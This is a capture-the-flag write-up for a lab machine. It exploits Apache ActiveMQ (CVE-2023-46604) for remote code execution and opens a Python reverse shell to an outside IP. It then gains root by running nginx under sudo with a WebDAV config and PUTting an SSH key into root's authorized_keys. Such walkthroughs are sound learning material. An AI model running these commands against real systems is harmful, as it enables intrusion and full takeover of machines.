# Broker – ActiveMQ Exploitation and Privilege Escalation

**Target:** `broker` (CTF Room)
**Goal:** Exploit Apache ActiveMQ (CVE-2023-46604) for RCE, escalate privileges to root via misconfigured `nginx` sudo access.


## 1. Reconnaissance

Performed a full TCP port and service scan:

**nmap -p- -sV -T4 -oN full.nmap <target-ip>**

Open ports:

* **8161** – Apache ActiveMQ Web Console
* **61616** – OpenWire protocol (used by ActiveMQ clients)

---

## 2. Gaining Access via Apache ActiveMQ (RCE)

Checked for an exposed web interface:

**curl http\://target-ip:8161/**

Tested default login credentials:

**admin\:admin** → Success

Identified the version as vulnerable to **CVE-2023-46604**.

Cloned the exploit repository:

**git clone https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell.git**  
**cd CVE-2023-46604-ActiveMQ-RCE-pseudoshell**



Ran the exploit:

**python3 exploit.py -i <target-ip> -p 61616 -si <your-ip> -sp 8080**

> Result: Semi-interactive pseudo-shell as `activemq` user.


---

## 3. Reverse Shell Upgrade

Set up a listener:

**nc -lvnp 4444**

Triggered a reverse shell from the pseudo-shell:

**python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(\["/bin/bash"])'**

> Result: Full interactive shell as `activemq`.

---

## 4. Privilege Escalation via NGINX

Checked sudo permissions:

**sudo -l**

Found:

**(ALL : ALL) NOPASSWD: /usr/sbin/nginx**

Created a malicious NGINX configuration:

**/tmp/nginx\_pwn.conf**

```
user root;
worker_processes 1;
pid /tmp/nginx.pid;
events {
    worker_connections 1024;
}
http {
    server {
        listen 8088;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

Started NGINX as root:

**sudo /usr/sbin/nginx -c /tmp/nginx\_pwn.conf**

---

## 5. Gaining Root via SSH

Generated an SSH key:

**ssh-keygen -t rsa -f /tmp/root\_key -N ""**

Uploaded the public key to root's authorized\_keys:

**curl -X PUT --data-binary "@/tmp/root\_key.pub" [http://127.0.0.1:8088/root/.ssh/authorized\_keys](http://127.0.0.1:8088/root/.ssh/authorized_keys)**

Set permissions and connected:

**chmod 600 /tmp/root\_key**
**ssh -i /tmp/root\_key root@<target-ip>**

> Result: Root shell obtained.

---

## 🔢 Outcome

* **Initial Access:** RCE using CVE-2023-46604
* **Shell:** Reverse shell via Python
* **Privilege Escalation:** Sudo access to nginx and file upload trick
* **Final Access:** Root via SSH key injection

---
